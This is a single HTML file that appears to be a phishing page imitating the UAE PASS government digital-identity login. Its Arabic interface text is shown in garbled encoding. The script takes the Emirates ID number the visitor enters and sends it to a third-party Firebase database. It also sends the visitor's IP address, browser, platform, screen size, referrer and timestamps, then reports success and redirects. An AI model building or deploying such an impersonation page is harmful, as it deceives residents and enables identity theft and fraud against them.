<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UAE PASS - ุชุณุฌูู ุงูุฏุฎูู</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="rectangle"></div>
    
    <div class="main-wrapper">
        <div class="container">
            <!-- ุฑุฃุณ ุงูุตูุญุฉ -->
            <header class="header">
                <div class="logo">
                    <img src="self_service.png" alt="UAE Pass Logo">
                </div>
                
                <h1 class="login-to-uaepass">
                    ุงูุฏุฎูู ุนู ุทุฑูู ุงููููุฉ ุงูุฑูููุฉ
                </h1>
            </header>
            
            <!-- ุงููุญุชูู ุงูุฑุฆูุณู -->
            <main class="login-content">
                <!-- ูููุฐุฌ ุชุณุฌูู ุงูุฏุฎูู -->
                <form id="loginForm">
                    <!-- ุญูู ุงุณู ุงููุณุชุฎุฏู -->
                    <div class="form-group">
                        <input type="text" 
                               class="form-input" 
                               id="username" 
                               name="username" 
                               placeholder="ุฑูู ุงููููุฉุ ุงูุจุฑูุฏ ุงูุฅููุชุฑูููุ ุฃู ุงููุงุชู"
                               required>
                    </div>
                    
                    <!-- ุฎุงูุฉ ุงูุงุฎุชูุงุฑ "ุชุฐูุฑูู" -->
                    <div class="form-options">
                        <div class="form-check">
                            <input type="checkbox" checked id="rememberme" name="rememberme">
                            <label class="checkbox-label" for="rememberme">ุชุฐูุฑูู</label>
                        </div>
                    </div>
                    
                    <!-- ุฒุฑ ุชุณุฌูู ุงูุฏุฎูู -->
                    <div class="form-group-button">
                        <button type="submit" class="btn-login" id="submitButton">
                            ุชุณุฌูู ุงูุฏุฎูู
                        </button>
                    </div>
                </form>
                
                <!-- ุงููุงุตู -->
                <div class="divider">
                    <hr class="style">
                    <span class="divider-text">ุฃู</span>
                </div>
                
                <!-- ุงูุฅุฌุฑุงุกุงุช ุงููุชุนููุฉ ุจุงูุญุณุงุจ -->
                <div class="account-actions">
                    <div class="dont-have-account">
                        <span class="account-text">ููุณ ูุฏูู ุญุณุงุจุ</span>
                        <a href="#" class="create-new-account">ุฅูุดุงุก ุญุณุงุจ ุฌุฏูุฏ</a>
                    </div>
                    
                    <div class="recover-account">
                        <a href="#" class="recover-link">ููููุฉ ุงุณุชุนุงุฏุฉ ุงูุญุณุงุจุ</a>
                    </div>
                </div>
                
                <!-- ุฒุฑ ุชุทุจูู UAE PASS -->
                <div class="uaepass-app">
                    <button class="btn-app" type="button">
                        <span class="btn-text">UAE PASS App</span>
                    </button>
                </div>
            </main>
            
            <!-- ุชุฐููู ุงูุตูุญุฉ -->
            <footer class="footer">
                <div class="footer-links">
                    <a href="#" class="menu-link">ุงูุฏุนู</a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">ุงูุฃุณุฆูุฉ ุงูุดุงุฆุนุฉ</a>
                    <span class="menu-separator">|</span>
                    <a href="#" class="menu-link">ูุจุฐุฉ ุนุงูุฉ</a>
                </div>
                <div class="copyright">
                    ุญููู ุงููุดุฑ ยฉ 2025 ุงููููุฉ ุงูุฑูููุฉ ุฌููุน ุงูุญููู ูุญููุธุฉ.
                </div>
            </footer>
        </div>
    </div>

    <!-- Firebase SDK ููู Realtime Database -->
    <script type="module">
        // ุงุณุชูุฑุงุฏ ูุญุฏุงุช Firebase ุงููุทููุจุฉ
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
        import { 
            getDatabase, 
            ref, 
            push, 
            set, 
            serverTimestamp 
        } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";

        // โ๏ธ ุชูููู Firebase - ุชุฃูุฏ ูู ุฅุถุงูุฉ databaseURL
        const firebaseConfig = {
            apiKey: "AIzaSyA1c9ft1XJrmjKIwhdxixJ1KM5Q3VL9HvQ",
            authDomain: "uaewep-38378.firebaseapp.com",
            databaseURL: "https://uaewep-38378-default-rtdb.firebaseio.com", // โฌ๏ธ ููู ุฌุฏุงู!
            projectId: "uaewep-38378",
            storageBucket: "uaewep-38378.firebasestorage.app",
            messagingSenderId: "366757774392",
            appId: "1:366757774392:web:32da696c806184709ed2cd",
            measurementId: "G-XNZC0GHCMM"
        };

        // ุชููุฆุฉ Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // ===== ุงูุชุญูู ูู ุงุชุตุงู Firebase =====
        function testFirebaseConnection() {
            console.log("๐ ุฌุงุฑู ุงุฎุชุจุงุฑ ุงุชุตุงู Firebase...");
            console.log("Project ID:", firebaseConfig.projectId);
            console.log("Database URL:", firebaseConfig.databaseURL);
            
            // ูุญุงููุฉ ูุฑุงุกุฉ ุจุณูุทุฉ
            const testRef = ref(database, 'test_connection');
            set(testRef, {
                test: true,
                timestamp: new Date().toISOString()
            }).then(() => {
                console.log("โ ุงุชุตุงู Firebase ูุงุฌุญ!");
            }).catch((error) => {
                console.error("โ ูุดู ุงูุงุชุตุงู ุจู Firebase:", error);
                showMessage('ุชุนุฐุฑ ุงูุงุชุตุงู ุจูุงุนุฏุฉ ุงูุจูุงูุงุช', 'error');
            });
        }

        // ===== ุฏุงูุฉ ุงูุชุญูู ูู ุฑูู ุงููููุฉ =====
        function validateEmiratesID(idNumber) {
            if (!idNumber || idNumber.trim() === '') {
                return { 
                    isValid: false, 
                    message: "ูุฑุฌู ุฅุฏุฎุงู ุฑูู ุงููููุฉ" 
                };
            }
            
            // ุฅุฒุงูุฉ ุงููุณุงูุงุช ูุงูุฑููุฒ
            const cleanId = idNumber.replace(/\D/g, '');
            
            // ุงูุชุญูู ูู ุงูุทูู
            if (cleanId.length !== 15) {
                return { 
                    isValid: false, 
                    message: "ุฑูู ุงููููุฉ ุงูุฅูุงุฑุงุชู ูุชููู ูู 15 ุฑููุงู" 
                };
            }
            
            // ุงูุชุญูู ูู ุฃู ูููุง ุฃุฑูุงู
            if (!/^\d+$/.test(cleanId)) {
                return { 
                    isValid: false, 
                    message: "ุฑูู ุงููููุฉ ูุฌุจ ุฃู ูุญุชูู ุนูู ุฃุฑูุงู ููุท" 
                };
            }
            
            // ุงูุชุญูู ูู ุงูุจุงุฏุฆุฉ (784 ููุฅูุงุฑุงุช)
            const prefix = cleanId.substring(0, 3);
            if (!['784'].includes(prefix)) {
                return { 
                    isValid: false, 
                    message: "ุฑูู ุงููููุฉ ุงูุฅูุงุฑุงุชู ูุจุฏุฃ ุจู 784" 
                };
            }
            
            return { 
                isValid: true, 
                cleanedId: cleanId,
                prefix: prefix,
                year: cleanId.substring(3, 7),  // ุณูุฉ ุงููููุงุฏ
                random: cleanId.substring(7, 14), // ุงูุฃุฑูุงู ุงูุนุดูุงุฆูุฉ
                checkDigit: cleanId.substring(14, 15) // ุฑูู ุงูุชุญูู
            };
        }

        // ===== ุฏุงูุฉ ูุฌูุจ ุนููุงู IP =====
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) throw new Error('ูุดู ุฌูุจ IP');
                const data = await response.json();
                return data.ip || 'ุบูุฑ ูุนุฑูู';
            } catch (error) {
                console.warn('โ ูุง ูููู ุฌูุจ IP:', error);
                return 'ุบูุฑ ูุนุฑูู';
            }
        }

        // ===== ุฏุงูุฉ ูุญูุธ ุงูุจูุงูุงุช ูู Realtime Database =====
        async function saveUserData(idNumber, rememberMe) {
            try {
                console.log("๐พ ุฌุงุฑู ุญูุธ ุงูุจูุงูุงุช...");
                
                // ุงูุชุญูู ูู ุฑูู ุงููููุฉ
                const validation = validateEmiratesID(idNumber);
                if (!validation.isValid) {
                    throw new Error(validation.message);
                }

                // ุฌูุจ ูุนูููุงุช ุฅุถุงููุฉ
                const ipAddress = await getClientIP();
                
                // ุฅูุดุงุก ูุงุฆู ุงูุจูุงูุงุช ุงููุงูู
                const userData = {
                    // ูุนูููุงุช ุงููููุฉ
                    idNumber: validation.cleanedId,
                    idPrefix: validation.prefix,
                    birthYear: validation.year,
                    checkDigit: validation.checkDigit,
                    
                    // ูุนูููุงุช ุงููุณุชุฎุฏู
                    rememberMe: rememberMe,
                    
                    // ูุนูููุงุช ุงูููุช
                    timestamp: new Date().toISOString(),
                    date: new Date().toLocaleDateString('ar-SA'),
                    time: new Date().toLocaleTimeString('ar-SA'),
                    serverTimestamp: serverTimestamp(),
                    
                    // ูุนูููุงุช ุงูุฌูุงุฒ
                    ipAddress: ipAddress,
                    userAgent: navigator.userAgent,
                    language: navigator.language || 'ar',
                    platform: navigator.platform || 'ุบูุฑ ูุนุฑูู',
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    
                    // ูุนูููุงุช ุงููุชุตูุญ
                    browserName: getBrowserName(),
                    isMobile: /Mobi|Android/i.test(navigator.userAgent),
                    
                    // ูุนูููุงุช ุงูุตูุญุฉ
                    referrer: document.referrer || 'ุฏุฎูู ูุจุงุดุฑ',
                    pageUrl: window.location.href
                };
                
                console.log("๐ฆ ุงูุจูุงูุงุช ุงููุฑุงุฏ ุญูุธูุง:", userData);

                // ุฅูุดุงุก ูุฑุฌุน ููุจูุงูุงุช
                const usersRef = ref(database, 'users');
                
                // ุฅูุดุงุก ููุชุงุญ ูุฑูุฏ ูุฅุถุงูุฉ ุงูุจูุงูุงุช
                const newUserRef = push(usersRef);
                await set(newUserRef, userData);
                
                console.log("โ ุชู ุงูุญูุธ ุจูุฌุงุญ!");
                console.log("๐ ุงูููุชุงุญ ุงููุฑูุฏ:", newUserRef.key);
                
                return {
                    success: true,
                    key: newUserRef.key,
                    id: validation.cleanedId,
                    message: "ุชู ุญูุธ ุฑูู ุงููููุฉ ุจูุฌุงุญ ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช"
                };

            } catch (error) {
                console.error("โ ุฎุทุฃ ูู ุญูุธ ุงูุจูุงูุงุช:", error);
                return {
                    success: false,
                    error: error.message || "ุญุฏุซ ุฎุทุฃ ุบูุฑ ูุนุฑูู"
                };
            }
        }

        // ===== ุฏุงูุฉ ููุนุฑูุฉ ุงุณู ุงููุชุตูุญ =====
        function getBrowserName() {
            const userAgent = navigator.userAgent;
            if (userAgent.includes("Chrome")) return "Chrome";
            if (userAgent.includes("Firefox")) return "Firefox";
            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
            if (userAgent.includes("Edge")) return "Edge";
            if (userAgent.includes("Opera")) return "Opera";
            return "ูุชุตูุญ ุขุฎุฑ";
        }

        // ===== ุฏุงูุฉ ูุนุฑุถ ุงูุฑุณุงุฆู =====
        function showMessage(message, type = 'info') {
            // ุฅุฒุงูุฉ ุงูุฑุณุงุฆู ุงููุฏููุฉ
            const oldMessages = document.querySelectorAll('.form-message');
            oldMessages.forEach(msg => msg.remove());
            
            // ุฅูุดุงุก ุงูุฑุณุงูุฉ ุงูุฌุฏูุฏุฉ
            const messageElement = document.createElement('div');
            messageElement.className = `form-message ${type}`;
            messageElement.textContent = message;
            
            // ุชูุณูู ุงูุฑุณุงูุฉ
            const styles = {
                error: 'background: #fee; color: #c00; border: 1px solid #fcc;',
                success: 'background: #efe; color: #090; border: 1px solid #cfc;',
                info: 'background: #eef; color: #009; border: 1px solid #ccf;'
            };
            
            messageElement.style.cssText = `
                padding: 12px 20px;
                margin: 20px 0;
                border-radius: 10px;
                text-align: center;
                font-family: 'Cairo', sans-serif;
                font-size: 15px;
                font-weight: 600;
                animation: fadeIn 0.3s ease-in;
                ${styles[type] || styles.info}
                box-shadow: 0 3px 10px rgba(0,0,0,0.1);
            `;
            
            // ุฅุถุงูุฉ ุงูุฑุณุงูุฉ ููู ุงููููุฐุฌ
            const form = document.getElementById('loginForm');
            form.parentNode.insertBefore(messageElement, form);
            
            // ุฅุฒุงูุฉ ุงูุฑุณุงูุฉ ุจุนุฏ 5 ุซูุงู
            setTimeout(() => {
                if (messageElement.parentNode) {
                    messageElement.style.opacity = '0';
                    messageElement.style.transition = 'opacity 0.5s';
                    setTimeout(() => messageElement.remove(), 500);
                }
            }, 5000);
        }

        // ===== ูุนุงูุฌุฉ ุงููููุฐุฌ =====
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const submitButton = document.getElementById('submitButton');
            const rememberMe = document.getElementById('rememberme').checked;
            
            // ุงูุชุญูู ูู ุฅุฏุฎุงู ุงูุจูุงูุงุช
            if (!username) {
                showMessage('โ ูุฑุฌู ุฅุฏุฎุงู ุฑูู ุงููููุฉ', 'error');
                return;
            }
            
            // ุนุฑุถ ุญุงูุฉ ุงูุชุญููู
            const originalText = submitButton.textContent;
            submitButton.textContent = 'ุฌุงุฑู ุงูุญูุธ ูู ูุงุนุฏุฉ ุงูุจูุงูุงุช...';
            submitButton.disabled = true;
            submitButton.style.opacity = '0.8';
            
            try {
                // ุญูุธ ุงูุจูุงูุงุช ูู Firebase
                const result = await saveUserData(username, rememberMe);
                
                if (result.success) {
                    // ุนุฑุถ ุฑุณุงูุฉ ุงููุฌุงุญ
                    showMessage(`โ ${result.message} - ุงูุฑูู: ${result.id}`, 'success');
                    
                    // ุญูุธ ูู localStorage ุฅุฐุง ุชู ุงุฎุชูุงุฑ "ุชุฐูุฑูู"
                    if (rememberMe) {
                        localStorage.setItem('last_emirates_id', result.id);
                        localStorage.setItem('remember_me', 'true');
                        localStorage.setItem('last_save_time', new Date().toISOString());
                    } else {
                        localStorage.removeItem('last_emirates_id');
                        localStorage.removeItem('remember_me');
                    }
                    
                    // ุชุบููุฑ ูุธูุฑ ุงูุฒุฑ ููุฅุดุงุฑุฉ ูููุฌุงุญ
                    submitButton.textContent = 'โ ุชู ุงูุญูุธ ุจูุฌุงุญ';
                    submitButton.style.backgroundColor = '#00ac75';
                    submitButton.style.color = 'white';
                    
                    // ุฅุนุงุฏุฉ ุชุนููู ุงููููุฐุฌ ุจุนุฏ ูุฌุงุญ ุงูุญูุธ
                    setTimeout(() => {
                        document.getElementById('username').value = '';
                        document.getElementById('rememberme').checked = false;
                    }, 1000);
                    
                    // ุฅุนุงุฏุฉ ุงูุชูุฌูู ุจุนุฏ 3 ุซูุงู
                    setTimeout(() => {
                        window.location.href = 'index.html?save=success&id=' + result.id;
                    }, 3000);
                    
                } else {
                    showMessage(`โ ${result.error}`, 'error');
                    submitButton.textContent = originalText;
                    submitButton.disabled = false;
                    submitButton.style.opacity = '1';
                }
                
            } catch (error) {
                showMessage('โ ุญุฏุซ ุฎุทุฃ ุบูุฑ ูุชููุน: ' + error.message, 'error');
                submitButton.textContent = originalText;
                submitButton.disabled = false;
                submitButton.style.opacity = '1';
            }
        });

        // ===== ุชุญููู ุงูุจูุงูุงุช ุงููุญููุธุฉ ุนูุฏ ูุชุญ ุงูุตูุญุฉ =====
        window.addEventListener('DOMContentLoaded', () => {
            const savedId = localStorage.getItem('last_emirates_id');
            const rememberMe = localStorage.getItem('remember_me');
            const lastSaveTime = localStorage.getItem('last_save_time');
            
            if (savedId && rememberMe === 'true') {
                document.getElementById('username').value = savedId;
                document.getElementById('rememberme').checked = true;
                
                // ุนุฑุถ ููุช ุขุฎุฑ ุญูุธ
                if (lastSaveTime) {
                    const lastSave = new Date(lastSaveTime);
                    const now = new Date();
                    const diffHours = Math.floor((now - lastSave) / (1000 * 60 * 60));
                    
                    if (diffHours < 24) {
                        console.log(`๐ ุขุฎุฑ ุญูุธ ูุงู ูุจู ${diffHours} ุณุงุนุฉ`);
                    }
                }
            }
            
            // ุงุฎุชุจุงุฑ ุงูุงุชุตุงู ุจู Firebase
            setTimeout(testFirebaseConnection, 1000);
        });

        // ===== ุฅุถุงูุฉ ุฃููููุดู ููุฑุณุงุฆู =====
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-15px); }
                to { opacity: 1; transform: translateY(0); }
            }
            
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
            
            .btn-login:disabled {
                cursor: not-allowed;
                animation: pulse 2s infinite;
            }
        `;
        document.head.appendChild(style);

        // ===== ุฅุถุงูุฉ ุฒุฑ ุงุฎุชุจุงุฑ ูู ุงูู Console =====
        console.log("๐ง ุฃุฏูุงุช ุงูุชุทููุฑ:");
        console.log("- ุงุฎุชุจุฑ ุงูุญูุธ: testSave('784123456789012')");
        console.log("- ุนุฑุถ ุงูุจูุงูุงุช: viewData()");
        
        // ุฏุงูุฉ ุงุฎุชุจุงุฑ ูู ุงูู Console
        window.testSave = async function(testId = '784123456789012') {
            console.log("๐งช ุฌุงุฑู ุงุฎุชุจุงุฑ ุงูุญูุธ...");
            const result = await saveUserData(testId, true);
            console.log("ูุชูุฌุฉ ุงูุงุฎุชุจุงุฑ:", result);
            return result;
        };
        
        window.viewData = function() {
            const savedId = localStorage.getItem('last_emirates_id');
            console.log("๐ ุงูุจูุงูุงุช ุงููุญููุธุฉ ูุญููุงู:");
            console.log("- ุฑูู ุงููููุฉ:", savedId);
            console.log("- ุชุฐูุฑูู:", localStorage.getItem('remember_me'));
            console.log("- ุขุฎุฑ ุญูุธ:", localStorage.getItem('last_save_time'));
        };

        // ===== ูุนุงูุฌุฉ ุฑุณุงุฆู ุงูุฎุทุฃ ุงูุนุงูุฉ =====
        window.addEventListener('error', function(event) {
            console.error('โ๏ธ ุฎุทุฃ ุนุงู:', event.error);
        });

        // ===== ุชุญุณูู ุฃุฏุงุก ุงูุตูุญุฉ =====
        window.addEventListener('load', function() {
            console.log("๐ ุตูุญุฉ ุชุณุฌูู ุงูุฏุฎูู ุฌุงูุฒุฉ!");
            console.log("๐ก ุญุงูุฉ ุงูุงุชุตุงู:", navigator.onLine ? "ูุชุตู" : "ุบูุฑ ูุชุตู");
            
            // ูุฑุงูุจุฉ ุญุงูุฉ ุงูุงุชุตุงู
            window.addEventListener('online', () => {
                console.log("๐ ุชู ุงุณุชุนุงุฏุฉ ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช");
                showMessage('ุชู ุงุณุชุนุงุฏุฉ ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช', 'info');
            });
            
            window.addEventListener('offline', () => {
                console.warn("โ๏ธ ููุฏุงู ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช");
                showMessage('ููุฏุงู ุงูุงุชุตุงู ุจุงูุฅูุชุฑูุช - ุณูุชู ุญูุธ ุงูุจูุงูุงุช ูุญููุงู', 'error');
            });
        });

    </script>
</body>
</html>
